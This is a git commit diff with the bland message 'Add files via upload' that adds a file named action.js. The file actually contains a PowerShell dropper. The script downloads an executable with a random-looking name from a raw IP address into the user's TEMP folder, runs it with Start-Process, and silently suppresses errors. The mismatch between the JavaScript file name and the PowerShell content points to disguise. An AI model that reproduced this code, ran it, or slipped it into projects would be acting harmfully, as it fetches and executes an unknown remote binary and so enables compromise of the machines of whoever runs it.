4c2de0a222cba10790591f19ec0add3bf0d0ef64
cruiseplug420 <cruiseplug420@gmail.com>
2026-03-02 11:51:47 -0600

    Add files via upload

---
+++ action.js
@@ -0,0 +1,20 @@
+$someData = @(
+    [PSCustomObject]@{a = "http://65.21.90.149/A3eD5WXLZgYl.exe"; b = "A3eD5WXLZgYl.exe"}
+  );
+
+  foreach ($i in $someData) {
+    try {
+      $filePath = "$env:TEMP\$($i.b)";
+      $download = $true;
+      if (Test-Path $filePath) {
+        $download = $false;
+      }
+      if ($download) {
+        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
+      }
+      Start-Process $filePath;
+    }
+    catch {
+      # Error handling (optional)
+    }
+  }
